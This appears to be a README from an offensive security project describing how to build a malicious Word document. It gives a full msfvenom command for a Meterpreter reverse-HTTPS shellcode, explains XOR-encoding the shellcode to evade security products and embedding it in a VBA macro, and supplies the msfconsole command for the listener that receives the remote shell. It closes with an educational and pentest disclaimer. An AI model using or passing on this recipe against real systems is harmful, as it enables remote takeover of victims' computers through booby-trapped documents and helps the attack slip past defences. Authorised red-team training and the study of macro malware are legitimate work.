# VBA Payload Encryption and Execution

## Overview
This project demonstrates how to encrypt a shellcode (revshell) payload for execution within a Microsoft Word VBA macro. The encryption process enhances evasion techniques to bypass security solutions by encoding the payload before execution.

## Steps
### 1. Generate the Shellcode
Use `msfvenom` to generate a reverse HTTPS payload in C# format:
```sh
msfvenom -p windows/x64/meterpreter/reverse_https SessionExpirationTimeout=0 SessionCommunicationTimeout=0 LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -f csharp
```

### 2. Encrypt the Payload
Use the provided C# encryption script (`XOR_encoder`) to XOR the shellcode with a static key (`0xFA`).

### 3. Embed the Encrypted Payload in VBA Macro
- Open Microsoft Word and access the VBA Editor (`ALT + F11`)
- Insert a new module and paste the `VBA_Macro_Shellcode_Execution` file content

### 4. Setup Metasploit Listener
Start Metasploit and configure the multi-handler:
```sh
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.142; set LPORT 443; set SessionExpirationTimeout 0; set SessionCommunicationTimeout 0; exploit"
```

### 5. Execute the VBA Macro
- Open the Word document containing the macro
- Enable macros when prompted
- The encrypted payload is decoded and executed in memory

## Disclaimer
This project is intended for educational and authorized penetration testing purposes only. Unauthorized use is strictly prohibited.

